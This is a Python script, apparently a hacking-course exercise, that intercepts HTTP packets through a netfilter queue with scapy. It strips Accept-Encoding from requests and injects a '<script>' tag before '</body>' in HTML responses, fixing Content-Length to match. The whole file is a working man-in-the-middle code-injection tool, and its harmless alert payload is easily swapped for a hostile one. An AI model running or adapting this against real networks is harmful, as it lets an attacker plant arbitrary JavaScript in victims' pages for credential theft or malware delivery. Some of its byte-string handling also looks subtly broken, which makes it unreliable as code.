#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    print('[+] replacing file')
    packet[scapy.Raw].load = load
    # print('set_load load', load)
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        load = str(scapy_packet[scapy.Raw].load)
        injection_code = '<script>alert("test");</script>'

        if scapy_packet[scapy.TCP].dport == 80:
            print('[+] Request')
            load = re.sub(
                r'Accept-Encoding:.*?\r\n', '', load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print('[+] Response')

            load = load.replace('</body>', injection_code + '</body>')

            content_length_search = re.search(
                r'(?:Content-Length:\s)(\d*)', load)

            try:
                print('content_length_search', content_length_search.group(1))
            except:
                print('[-] no content length')


            if content_length_search and 'text/html' in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)

                print('new_content_length', new_content_length)
                load = load.replace(
                    str(content_length), str(new_content_length))

        if load != str(scapy_packet[scapy.Raw].load):
            try:
                mod_length_search = re.search(
                    r'(?:Content-Length:\s)(\d*)', load)
                print('mod_length_search', mod_length_search.group(1))
                new_packet = set_load(scapy_packet, load)
                print(new_packet.show())
                packet.set_payload(bytes(new_packet))
            except:
                print('[-] search error')

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
